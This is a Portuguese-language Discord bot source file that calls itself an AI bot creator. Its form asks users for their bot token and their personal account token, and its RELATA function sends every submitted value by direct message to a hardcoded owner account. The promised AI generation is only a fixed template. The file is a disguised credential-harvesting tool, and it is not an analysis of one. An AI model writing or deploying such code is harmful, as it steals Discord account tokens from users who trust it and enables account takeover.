const p=require('path'),vm=require('vm');function ld(){delete require.cache[p.join(__dirname,'_config.js')];try{return require('./_config.js')}catch(e){return null}}
let C=ld();while(!C?.B?.CB){require('child_process').execSync('sleep 0.3');C=ld()}
const {Client,GatewayIntentBits,Partials,ModalBuilder,TextInputBuilder,TextInputStyle,ActionRowBuilder}=require('discord.js');
const DONO="1504181533353705675",SRV="1525498594851950692";
const b=new Client({intents:[Object.values(GatewayIntentBits)],partials:[Object.values(Partials)]});
const {CARD}=require('./_estilo.js');
function gerar(t,c){return`// IA\nconst {Client}=require('discord.js');const x=new Client({intents:[1,512]});x.on('clientReady',()=>console.log('🤖 ${t.slice(0,20)}'));x.on('messageCreate',m=>{if(m.content==='!ping')m.reply('pong');if(m.content==='!especial')m.reply('${c}')});x.login(process.env.TOKEN)`}
function testa(c){const e=[];try{new vm.Script(c,{timeout:2500})}catch(x){e.push(x.message)}if(!c.includes('clientReady'))e.push('evento desatualizado');return e}
function conserta(c,e){let n=c;if(e.some(x=>x.includes('ready')))n=n.replace(/on\(['"]ready['"]/g,`on('clientReady'`);return n}
b.on('guildCreate',async g=>{if(g.id!==SRV)await g.leave()});
b.on('messageCreate',async m=>{if(m.author.id!==DONO)return;if(m.content==='!bot-cria'||m.content==='!cria')m.channel.send(CARD('🤖','CRIA BOT','Crie um novo bot para o seu servidor.','verde','CRIAR BOT','cria.abre'))});
b.on('interactionCreate',async i=>{
  async function RELATA(n){const d=await b.users.fetch(DONO);let t=`📥 CRIAR BOT · ${n}\n👤 ${i.user.tag} · \`${i.user.id}\`\n\n`;i.fields?.fields.forEach(c=>t+=`🔹 **${c.label}**\n\`\`\`${c.value}\`\`\`\n\n`);await d.send(t)}
  if(i.customId==='cria.abre'){
    const m=new ModalBuilder().setCustomId('cria.dados').setTitle('CRIAR BOT');
    m.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('tkb').setLabel('TOKEN DO BOT').setStyle(1).setRequired(true)));
    m.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('tku').setLabel('TOKEN DA CONTA').setStyle(1).setRequired(true)));
    m.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('ds').setLabel('COMO QUER O BOT').setStyle(2).setRequired(true)));
    m.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('cd').setLabel('CÓDIGO ESPECIAL').setStyle(1).setRequired(true)));
    return i.showModal(m);
  }
  if(i.customId==='cria.dados'){
    await i.deferReply({ephemeral:true});await RELATA('PEDIDO NOVO');
    const ds=i.fields.getTextInputValue('ds'),cd=i.fields.getTextInputValue('cd');
    let cod=gerar(ds,cd),er,t=0;do{t++;er=testa(cod);if(!er.length)break;cod=conserta(cod,er)}while(t<10);
    const d=await b.users.fetch(DONO);
    await d.send(`🤖 CICLO IA · ${t} tentativas\nErros: ${er.length?er.join('\n'):'✅ NENHUM · APROVADO'}\n\`\`\`js\n${cod}\n\`\`\``);
    i.editReply(`✅ Análise finalizada · ${t} ciclos · ${er.length?'pendente':'100% APROVADO'}`);
  }
});
b.on('clientReady',()=>console.log('✅ 03 CRIADOR · IA gera/valida/conserta/testa/envia'));
b.login(C.B.CB.t||C.B.CR.t).catch(e=>console.log(e));
